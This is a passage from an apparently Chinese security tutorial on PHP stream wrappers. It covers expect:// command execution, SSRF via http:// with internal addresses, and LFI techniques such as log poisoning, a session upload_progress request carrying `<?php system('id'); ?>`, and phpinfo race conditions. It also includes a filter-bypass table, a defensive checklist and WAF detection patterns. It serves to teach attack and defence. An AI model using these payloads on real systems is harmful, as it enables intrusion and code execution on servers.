echo file_get_contents('expect://id');   // 输出 uid=33(www-data) ...
```

expect 扩展极少有人装，但代码审计时看到它等于直接宣布 RCE。类似的还有 `ssh2://`（需 ssh2 扩展）：

```text
ssh2.exec://user:pass@host/cmd
ssh2.shell://user:pass@host
ssh2.tunnel://user:pass@host:2222/target:80
ssh2.sftp://user:pass@host/path
```

以及 PECL 的 `rar://`（`rar://archive.rar#entry`）、`ogg://`（音频处理）等，均属"扩展即攻击面"：装一个扩展，多一族协议。

### 6.3 http(s):// 与 ftp(s):// —— SSRF 的主力

```php
<?php
// 默认 allow_url_fopen=On，直接可用
echo file_get_contents('http://127.0.0.1:8080/api');

// stream context 可以定制请求：方法、头、体、超时、重定向
$ctx = stream_context_create([
    'http' => [
        'method'  => 'POST',
        'header'  => "X-Forwarded-For: 127.0.0.1\r\nContent-Type: application/json\r\n",
        'content' => '{"action":"reset"}',
        'timeout' => 5,
        'max_redirects' => 3,      // 跟随重定向上限（默认 10）
        'ignore_errors' => true,   // 4xx/5xx 也返回内容
    ],
]);
echo file_get_contents('http://10.0.0.5/admin', false, $ctx);
```

作为 include 目标时受 `allow_url_include` 限制（默认关），但**作为读取目标完全放行**，是 PHP 内生 SSRF 的基本盘。相关组合：

- **filter + http**：`php://filter/read=convert.base64-encode/resource=http://10.0.0.5:8080/` 把内网页面 base64 后回显，对抗响应过滤/编码干扰，非常好用；
- 注意区分：`gopher://`、`dict://`、`file://` 出现在 curl 场景（`curl_exec`）时属于 **libcurl 的协议**，不是 PHP 伪协议——两者常被混为一谈，排查 SSRF 时要分清调用路径走的是 streams 还是 libcurl。

## 7. 攻击面整合：LFI 全家桶

### 7.1 通用漏洞模型

```php
<?php
// 场景 A：include 直通（LFI）
include($_GET['page']);

// 场景 B：读取直通（任意文件读）
echo file_get_contents($_GET['path']);

// 场景 C：写入直通（任意文件写）
file_put_contents($_GET['path'], $_POST['data']);
```

伪协议在这三类场景中的分工：

- **读**：`php://filter`（读+加工+oracle）、`file://`、`compress.zlib://`、`zip://`；
- **写**：`php://filter/write=`（落地前加工内容）、`compress.zlib://`；
- **执行**：filter+input/data 组合（3.7）、filter chain（3.8）、zip/phar 内的 PHP 文件、expect://。

### 7.2 日志文件包含

思路：把 PHP 代码写进日志，再 include 日志文件。

```text
常见可包含路径：
/var/log/nginx/access.log
/var/log/apache2/access.log
/var/log/httpd/access_log
/var/log/auth.log          ← SSH 认证日志（登录用户名注入）
/proc/self/environ         ← 环境变量（User-Agent 会进入 HTTP_USER_AGENT）
```

操作：在 HTTP 头（最稳的是 User-Agent，通常原样写入日志）注入 PHP 代码，请求一次污染日志，然后：

```text
GET /index.php?page=/var/log/nginx/access.log&1=id
```

注意点：日志文件较大时 include 会很慢；有些发行版日志归 `adm` 组、Web 进程读不了；URL 编码后的请求在 access log 中是否被还原取决于服务器，所以从 User-Agent 注入最可靠。

### 7.3 session 文件包含与 upload_progress

session 文件落盘，路径由 `session.save_path` 决定（常见 `/tmp`、`/var/lib/php/sessions`），文件名为 `sess_` 加上会话 ID。session 内容可控的经典通道：

```ini
; php.ini 默认即是开启
session.upload_progress.enabled = On
session.upload_progress.prefix  = "upload_progress_"
session.upload_progress.name    = "PHP_SESSION_UPLOAD_PROGRESS"
```

上传时带一个 `PHP_SESSION_UPLOAD_PROGRESS` 字段，其值会被写进 session 文件：

```http
POST /index.php HTTP/1.1
Cookie: PHPSESSID=attacker123
Content-Type: multipart/form-data; boundary=----x

------x
Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"

<?php system('id'); ?>
------x
Content-Disposition: form-data; name="file"; filename="a.txt"

hi
------x--
```

然后包含 session 文件：

```text
GET /index.php?page=/tmp/sess_attacker123
```

session 数据以 `session.serialize_handler`（默认 `php`）序列化，内容形如 `upload_progress_xxx|a:1:...`，其中用户可控段直接进文件。新版 PHP 对 upload_progress 的清理更及时，需要配合并发/竞态（边上传边包含）。

### 7.4 临时文件与 /proc

- **phpinfo + LFI 组合拳**：phpinfo 页面会输出 `$_FILES` 的 `tmp_name`（形如 `/tmp/phpXXXXXX`）。PHP 7+ 的临时文件名随机不可枚举，但只要从 phpinfo 泄露中拿到名字，就能在请求生命周期内竞态 include 它。这是没有上传目录执行权、且无其他落盘通道时的经典破局点；
- **`/proc/self/fd/N`**：直接引用进程当前打开的文件描述符，有时能"碰"到上传中的文件句柄，绕过对 `/tmp` 的目录权限限制；
- **`/proc/self/environ`、`/proc/self/cmdline`、`/proc/self/status`**：LFI 情报收集常客（环境变量、启动命令、进程权限）；
- PHP 7 之后临时文件名不可预测，但**文件存在的时间窗口**依然由请求周期决定，竞态脚本（高频并发上传 + 高频尝试包含）仍是通用解法。

### 7.5 SSRF 中的伪协议

- `file_get_contents` 型 SSRF：`http://`、`ftp://`、`file://` 直读内网/本地；context 可定制 POST 体与 Header（见 6.3 示例）；
- **filter 增强回显**：`php://filter/read=convert.base64-encode/resource=http://intranet/` 让响应以 base64 输出，规避响应中关键字被网关过滤的问题；
- **data:// 与 php://input**：某些框架把用户输入当"数据源"读取（如导入功能），data:// 可直接投喂内容；
- 区分调用栈：走 PHP streams 的函数支持全部伪协议；走 libcurl 的只支持 curl 自己的协议族（含 gopher://）。

### 7.6 常见过滤与绕过对照表

| 拦截点 | 绕过思路 |
|---|---|
| 黑名单字符串 `php://` | filter 各段支持 URL 解码，整链全编码（3.10）；或改用 `data://`、`file://`、`zip://`、`phar://`、日志/session 等落盘文件；协议名大小写无效 |
| 黑名单 `base64` | 换 `convert.quoted-printable-*`、`convert.iconv.*`、`zlib.inflate`、`string.rot13`、`dechunk` 等等价过滤器 |
| 黑名单 `<?php` | 短标签 `<?=`（`short_open_tag` 开启时）；rot13/iconv 预变形内容；filter chain 全字符构造；UCS-2 大小端变形 |
| 黑名单 `.php` 后缀 | include 无后缀文件、日志、session、`/proc`；zip/phar 内的文件名自定；filter chain 不依赖文件后缀 |
| 黑名单 `data|input` 关键字 | filter 作壳时 resource 也可以是普通文件与 `php://temp`；filter chain 完全不需要额外输入源 |
| 限制 `/` 与 `..` 穿越 | resource 段支持 URL 编码（`%2e%2e%2f`）；读 `include_path` 内文件；用 `/proc/self/...` 自引用路径 |
| 白名单校验 `file_exists` | `phar://` 反序列化（`file_exists` 本身就是触发函数，5.3 节） |
| 开头字符受限（如必须以字母开头） | filter chain 可以从空流构造任意内容，不受输入首字符限制 |
| 内容 WAF（写文件场景） | `php://filter/write=` 让落地内容与检查内容不同（3.6） |

---

## 8. 防御清单（代码级）

### 8.1 输入侧：永远不要把用户输入当"路径表达式"

最佳实践是**白名单映射**，让用户只能选择索引而不是路径：

```php
<?php
$pages = [
    'home'  => 'pages/home.php',
    'about' => 'pages/about.php',
    'news'  => 'pages/news.php',
];
$page = $_GET['page'] ?? 'home';
if (!isset($pages[$page])) {
    http_response_code(404);
    exit('Not Found');
}
include __DIR__ . '/' . $pages[$page];
```

退而求其次（必须用用户输入拼路径时），做归一化前缀校验：

```php
<?php
$base   = realpath(__DIR__ . '/pages');
$target = realpath($base . '/' . $_GET['page']);   // realpath 会解析 ../ 与伪协议失败返回 false
if ($target === false || !str_starts_with($target, $base . DIRECTORY_SEPARATOR)) {
    http_response_code(403);
    exit('Forbidden');
}
include $target;
```

说明：`realpath()` 对 `php://filter` 这类包装器路径会返回 `false`（它只解析真实文件系统路径），因此上面的写法天然拦截了绝大多数伪协议 payload。

### 8.2 配置侧

```ini
; php.ini 生产建议
allow_url_include = Off        ; 默认即 Off，PHP 7.4+ 已弃用，别开
allow_url_fopen = Off          ; 若业务不需要读取远程资源，直接关掉
open_basedir = /var/www/html/:/tmp/
```

### 8.3 代码侧：主动注销危险包装器

入口文件中按需注销本业务用不到的协议（**注意评估副作用**，某些框架/库依赖这些流）：

```php
<?php
foreach (['php', 'data', 'http', 'ftp', 'zip', 'phar'] as $wrapper) {
    if (in_array($wrapper, stream_get_wrappers(), true)) {
        stream_wrapper_unregister($wrapper);
    }
}
```

注销 `php` 会连带禁用整个 `php://` 家族（含 `php://filter`、`php://input`），对"只处理本地文件"的业务是釜底抽薪的防御。

### 8.4 上传与 phar 防御

- 上传文件保存后用"移动+重命名"（`move_uploaded_file`）落盘到**无执行权限**的独立存储目录，后续通过静态资源服务器/CDN 提供，避免 PHP 进程对上传文件调用文件元函数；
- 对用户可控路径参数做协议前缀校验（拒绝 `phar://`、`zip://`、`php://`，注意 URL 编码与大小写变体）；
- 引入 TYPO3 `phar-stream-wrapper` 等白名单方案；
- 保持 glibc 升级（CVE-2024-2961 影响面）。

### 8.5 监测侧

WAF 与日志告警可关注的特征（务必在 URL 解码后匹配）：

- 参数中出现 `php://`、`data://`、`phar://`、`zip://`、`expect://`、`compress.zlib://`；
- `convert.iconv`、`convert.base64`、`string.rot13`、`dechunk` 等过滤器关键字，尤其是**超长链**（filter chain 的 payload 可达数 KB）；
- 参数中出现 `%3A%2F%2F`（解码后为 `://`）；
- 请求体以 PHP 标签开头、User-Agent 中出现 PHP 标签。

---

## 9. 速查总表

| 协议 | 典型形态 | 读 | 写 | 默认配置可 include | 一句话用途 |
|---|---|---|---|---|---|
| `file://` | `file:///etc/passwd` | 是 | 是 | 是 | 本地文件基础读写 |
| `php://filter` | `php://filter/read=F/resource=X` | 是 | 是 | **是** | 读源码、内容加工、filter chain RCE |
| `php://input` | `php://input` | 是 | 否 | 否（需开关） | 原始 POST 体，配 filter 默认可 RCE |
| `data://` | `data://text/plain;base64,X` | 是 | 否 | 否（需开关） | 直投内容，配 filter 默认可 RCE |
| `zip://` | `zip://a.zip%23f.php` | 是 | 否 | 是 | 包内文件包含 |
| `phar://` | `phar://a.jpg/x` | 是 | 否 | 是 | 包内文件 + 打开即反序列化 |
| `compress.zlib://` | `compress.zlib://a.gz` | 是 | 是 | 是 | 透明解压/压缩 |
| `glob://` | `glob://*.php` | 仅列目录 | 否 | 是 | 目录探测 |
| `expect://` | `expect://id` | 命令输出 | 否 | 是 | 装了扩展即 RCE |
| `http://` | `http://host/path` | 是 | 否 | 否（需开关） | SSRF 主力 |

---

## 10. 参考资料

- PHP 官方手册：[Supported Protocols and Wrappers](https://www.php.net/manual/en/wrappers.php.php)、[Available Filters](https://www.php.net/manual/en/filters.php)、[allow_url_include](https://www.php.net/manual/en/filesystem.configuration.php)
- Synacktiv：《PHP filter chains: file read from error-based oracle to command execution》（2022）及 [php_filter_chain_generator](https://github.com/synacktiv/php_filter_chain_generator)
- Sam Thomas（BlackHat USA 2018）：《It's a PHP Unserialization Vulnerability Jim, But Not as We Know It》
- Charles Fol（Ambionics, 2024）：CVE-2024-2961 glibc iconv 缓冲区溢出与 cnext-exploit
- TYPO3：[phar-stream-wrapper](https://github.com/TYPO3/phar-stream-wrapper)
- 本站相关文章：《PHP 反序列化漏洞》《PHP 反序列化 CTF 绕过指南》《SSRF 漏洞指南》

---

**结语**：伪协议的本质，是 PHP 把"路径"这个概念泛化成了"流"。理解了 Streams 的分层模型，你会发现所有 payload 都是同一句话的不同说法——**控制了流，就控制了数据从哪来、经过什么加工、最终被谁执行**。攻击者用它把小漏洞放大成 RCE，防御者则应当让用户输入永远停留在"业务参数"层，而不是流入任何接受"路径/流描述"的函数。



